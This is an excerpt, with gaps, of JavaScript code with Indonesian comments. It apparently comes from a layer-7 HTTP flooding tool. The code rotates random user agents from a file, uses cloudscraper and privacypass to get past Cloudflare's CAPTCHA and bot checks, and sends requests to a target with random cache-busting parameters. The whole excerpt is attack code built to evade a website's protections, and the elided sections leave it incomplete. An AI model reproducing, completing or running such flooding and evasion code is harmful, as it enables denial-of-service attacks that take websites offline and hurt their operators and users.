...
function getRandomUserAgentFromFile(filePath) {
    const userAgents = fs.readFileSync(filePath, 'utf-8').split('\n').filter(Boolean);
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

const useragent = getRandomUserAgentFromFile('useragents.txt');
        ...
        cloudscraper.get({
            ...
            if (err || !res || !body || !res.headers['set-cookie']) {
                if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                    // Melewati CAPTCHA dengan Privacypass
                    privacypass({
                        url: parsedTarget.host + "?_asds=" + num,
                        connection: connection, // Gantilah ini dengan objek koneksi yang sesuai
                        // Tambahkan parameter lain sesuai kebutuhan
                    }).then(() => {
                        // Privacypass selesai, lanjutkan dengan permintaan HTTP Anda
                        sendRequest(l7.target + "?_asds=" + num, 'GET', headers);
                    }).catch(error => {
